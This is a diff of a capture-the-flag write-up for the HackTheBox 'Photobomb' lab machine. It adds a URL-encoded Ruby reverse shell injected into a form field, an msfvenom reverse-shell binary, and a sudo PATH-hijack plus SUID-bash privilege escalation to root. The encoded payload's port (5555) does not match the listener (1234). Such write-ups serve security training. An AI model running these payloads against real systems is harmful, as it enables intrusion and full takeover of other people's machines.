@@ -1,6 +1,8 @@
-### Tools:
+![image](https://user-images.githubusercontent.com/105310322/195705375-63f90af6-b2f9-4c0c-bee0-408ea2dc6cbf.png)
 
-### Vulnerabilities: 
+### Tools: msfvenom
+
+### Vulnerabilities: ,Sudo: Change Path Variable
 
 Nmap gives shows a webpage and ssh is open.
 
@@ -57,15 +59,35 @@ http://photobomb.htb/printerfriendly
 Now on to the actual Attack Vector!
 
 
-In BurpSuite intercept the ```Download Photo To Print```
+In BurpSuite intercept the ```Download Photo To Print``` and send it to repeater.
 
+In the file field we can implant a reverse shell.
 
-ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.11",1234))'
+I used ```ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.11",1234))'``` and URL encoded it.
 
-enocode
+After crafting your payload it should look something like below.
 
+Set up your listener and send your payload.
 
-photo=eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&filetype=jpg;%72%75%62%79%20%2d%72%73%6f%63%6b%65%74%20%2d%65%27%73%70%61%77%6e%28%22%73%68%22%2c%5b%3a%69%6e%2c%3a%6f%75%74%2c%3a%65%72%72%5d%3d%3e%54%43%50%53%6f%63%6b%65%74%2e%6e%65%77%28%22%31%30%2e%31%30%2e%31%36%2e%31%31%22%2c%31%32%33%34%29%29%27&dimensions=30x20
+```
+POST /printer HTTP/1.1
+Host: photobomb.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 316
+Origin: http://photobomb.htb
+Authorization: Basic cEgwdDA6YjBNYiE=
+Connection: close
+Referer: http://photobomb.htb/printer
+Upgrade-Insecure-Requests: 1
+
+photo=eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&filetype=jpg;%72%75%62%79%20%2d%72%73%6f%63%6b%65%74%20%2d%65%27%73%70%61%77%6e%28%22%73%68%22%2c%5b%3a%69%6e%2c%3a%6f%75%74%2c%3a%65%72%72%5d%3d%3e%54%43%50%53%6f%63%6b%65%74%2e%6e%65%77%28%22%31%30%2e%31%30%2e%31%36%2e%31%31%22%2c%35%35%35%35%29%29%27&dimensions=30x20
+```
+
+We get a shell as wizard!
 
 ```console
 └─$ nc -lvnp 1234                    
@@ -74,6 +96,8 @@ connect to [10.10.16.11] from (UNKNOWN) [10.129.44.124] 49918
 id
 uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
 ```
+
+Running sudo -l reveals that we can run cleanup.sh, but we can also set the PATH variable.
 
 ```console
 wizard@photobomb:/tmp$ sudo -l
@@ -86,7 +110,52 @@ User wizard may run the following commands on photobomb:
     (root) SETENV: NOPASSWD: /opt/cleanup.sh
 ```
 
+Checking out cleanup.sh shows that it is running chown whenever cleanup.sh is ran.
+
+Our plan of attack is to have cleanup.sh read our own file chown before anything else. 
+
+```
+wizard@photobomb:/tmp$ cat /opt/cleanup.sh
+cat /opt/cleanup.sh
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+```
+
+
+So we can either create a reverse shell with msfvenom or change the suid bit on /bin/bash. I will show both.
+
+
+Create your reverse shell and be sure to name it chown and then transfer it to the victim computer.
+
+Note: Be sure to chmod your chown before trying to exploit. ie ```chmod 777 chown```
+
+```console
+└─$ msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.16.11 lport=1235 -f elf -o chown
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: chown
+```
+
+The following command places /tmp as the first place in the path. This is where our chown is located. Set up our listener and grab it!
+
+```console
 wizard@photobomb:/tmp$ sudo PATH=/tmp\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin /opt/cleanup.sh
+```
+Awesome we got a root with a reverse shell.
 
 ```console
 └─$ nc -lvnp 1235
@@ -94,12 +163,20 @@ listening on [any] 1235 ...
 connect to [10.10.16.11] from (UNKNOWN) [10.129.44.124] 51630
 id
 uid=0(root) gid=0(root) groups=0(root)
+```
 
-bash-5.0# cat /dev/shm/chown
-cat /dev/shm/chown
+This payload is the same thing except my chown has my own script in it. I placed this chown in /dev/shm
+
+```
 #!/bin/bash
 chmod u+s /bin/bash
 ```
+Next I do the same thing but instead place /dev/shm in front of the others to be called first.
+
+Note: not putting the full paths for the other directory calls can mess up other commands that need to be ran.
+
+
+After running it we can check the permissions to verify our suid bit and then run ```bash -p``` to execute as root!
 
 ```console
 wizard@photobomb:/tmp$ sudo PATH=/dev/shm\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin /opt/cleanup.sh
@@ -123,3 +200,5 @@ bash-5.0# cat /root/root.txt
 cat /root/root.txt
 5ab2****************************
 ```
+
+Congratulations everyone!
